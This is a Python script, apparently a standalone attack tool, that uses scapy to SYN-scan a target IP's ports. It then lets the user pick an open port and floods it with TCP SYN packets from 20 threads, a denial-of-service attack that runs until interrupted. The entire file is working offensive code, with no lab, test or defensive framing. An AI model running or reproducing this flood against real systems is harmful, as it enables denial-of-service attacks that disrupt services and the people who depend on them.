import sys
import os
import threading
from scapy.all import *
from tqdm import tqdm  # For the progress bar
from queue import Queue
from colorama import Fore
import argparse
import random
import signal

stop_threads = False
thread_list = []


def parse_port_range(arg_input):
	#func: parse_port_range
	#args: arg_input -> string input from command line.
	#Docs: This function will create the format for the port argument
	try:
		start, end = map(int,arg_input.split(":"))
		if 1 <= start <= 65535 and 1 <= end <= 65535 and start < end:
			return start,end
		else:
			#Invalid Input of arguments
			raise ValueError
	except ValueError:
		raise argparse.ArgumentTypeError("Port range must be in the format start:end, with the values between 1 and 65535.")

# Function for scanning a range of ports
def scan_port_range(ip_adr, port_queue, progress_bar, open_ports,lock):
	#Func: scan_port_range
	#Args: ip_adr -> IP address of the target. port_queue -> List of , progress_bar -> Variable for loading bar. open_ports -> All possible open ports. lock -> Mutex lock for threads.
	#Docs: This Function is meant to be executed on each thread.
	while not port_queue.empty():
		port = port_queue.get()
		packet = IP(dst=ip_adr) / TCP(dport=port, flags='S')
		res = sr1(packet, timeout=1, verbose=False)
		if res and res.haslayer(TCP):
			# SYN-ACK received, port open
			if res[TCP].flags == 'SA':  # SYN-ACK received, port open
				with lock:
					open_ports.append(port)
		progress_bar.update(1)
		port_queue.task_done()

def scan_ports(ip_adr, startPort,endPort, num_threads=10):
	#Func: scan_ports
	#Args: ip_adr -> IP address for the port scanning. startPort-> The startport to be scanned. endPort-> The ending port to be scanned. num_threads-> Number of threads that will scan ports
	#Docs: This function will scan the ports in the range of startport to endport, using multi-threading.
	open_ports = []
	lock = threading.Lock()
	port_queue = Queue()
	total_ports = endPort - startPort  # Total number of ports
	print(f"Starting port scan of IP: {ip_adr}")
	print(f"Scanning ports {startPort} to {endPort}")
	# Add all ports to the queue
	for port in range(startPort,endPort+1):
		port_queue.put(port)

	# Create a single progress bar
	with tqdm(total=total_ports, desc="Scanning Ports") as progress_bar:
		threads = []
		for _ in range(num_threads):
			thread = threading.Thread(target=scan_port_range, args=(ip_adr, port_queue, progress_bar, open_ports,lock))
			threads.append(thread)
			thread.start()
		for t in threads:
			t.join()

	return open_ports
def get_valid_port(port_list):
	#Func: get_valid_port
	#args: port_list -> A list of all open ports.
	#Docs: This function will make sure that the user is entering the correct port number is the correct format.
	while True:
		try:
			port_num = input(Fore.WHITE+"Enter port to attack: ")
			if int(port_num) in port_list:
				return port_num
			else:
				print("Invalid input: Please enter a valid port that is open")
		except ValueError:
			print("Invalid input: Please enter a number that is a valid port open")
			

def target_port(ip_adr,open_ports):
	#Func: target_port
	#Args: ip_adr -> IP address of the target. open_ports -> All possible open ports.
	#Docs: This function will get user input can which port to attack.
	user_input = get_valid_port(open_ports)
	syn_flood(ip_adr,int(user_input))


def createSYNPacket(target_ip,target_port):
	#Func: createSYNPacket
	#Args:target_ip -> Taget IP address. target_port -> Port number to target.
	#Docs: This function will create the SYN packet for the DDoS attack.
	#This function will create the SYN packet
	seqN = random.randint(0,65535)
	src_port = random.randint(0,65535)
	rndm_raw = random.randint(1,1453)
	payload = Raw(b'SYNFLOOD')
	packet = IP(dst=target_ip)/TCP(sport=src_port,dport=target_port,flags="S",seq=seqN,window=0)/payload
	return packet
def send_packets(ip,target_port):
	#Func: send_packets
	#Args: ip -> IP of the target. target_port-> Target port number.
	#Docs: This function will send the SYN packet to the target.
	while not stop_threads:#not stop_event.is_set():
		packet = createSYNPacket(ip,target_port)
		send(packet,verbose=False)
def stop_attack():
	#Func: stop_attack
	#Args: None
	#Docs: This function when called, will STOP the attack by killing all threads.
	global stop_threads
	stop_threads = True
	for t in thread_list:
		t.join()
	print("Program has been stopped")

def syn_flood(ip_adr,port):
	#Func: syn_flood
	#Args: ip_adr -> IP address of the target. port -> The port number to target.
	#Docs: This function will execute the SYN flooding attack. By calling multiple threads.
	#thread_list = []
	thread_num = 20
	print(f"Attack port: {port}")
	print("TCP SYN flood attack in progress...")
	print("Press Ctrl+C to stop attack")
	print(f"Attacking IP: {ip_adr}:{port}")
	print(f"{thread_num} Threading running...")
	signal.signal(signal.SIGINT, lambda signum, frame: stop_attack())
	for x in range(thread_num):
		t1 = threading.Thread(target=send_packets,args=(ip_adr,port))
		t1.start()
		thread_list.append(t1)



def main():
	#Func: main
	#Args: None
	#Docs: This is the main function of the program.

	#Check if program in running in root
	if os.geteuid() != 0:
		#Program is running as root
		print("Must run program in ROOT mode: example: ($ sudo ddo.py {IP})")
		sys.exit(1)

	#Setting up the arguments
	parser = argparse.ArgumentParser()
	parser.add_argument("ip", type=str, help="Target IP address")
	group = parser.add_mutually_exclusive_group()
	group.add_argument("--port",type=parse_port_range,help="Port range in the format start:end (e.g., 100:200)")
	group.add_argument("--attack",type=int,help="Specify which Port you wish to attack.")

	args = parser.parse_args()

	ip = args.ip
	skip_portscan = False
	startPort = 1
	endPort = 65535
	attack_port = None
	if args.port:
		#User has provided start and end port
		start, end = args.port
		startPort = start
		endPort = end
	elif args.attack:
		#user has provided the attack port
		#Port scanning will be skipped
		skip_portscan = True
		attack_port = args.attack
	else:
		#User has provided no argument, program will run as normal
		pass

	if skip_portscan == False:
		open_ports = scan_ports(ip,startPort,endPort)
		if(len(open_ports) > 0):
			print("List of open PORTS")
			for port in open_ports:
				print(Fore.GREEN + f"PORT: {port} OPEN")
		else:
			print(Fore.RED+"No OPEN ports: DDOS attack can NOT be executed....")
			sys.exit(1)
		target_port(ip,open_ports)
	else:
		#No port scan need, Go straight to attack
		syn_flood(ip,int(attack_port))

main()
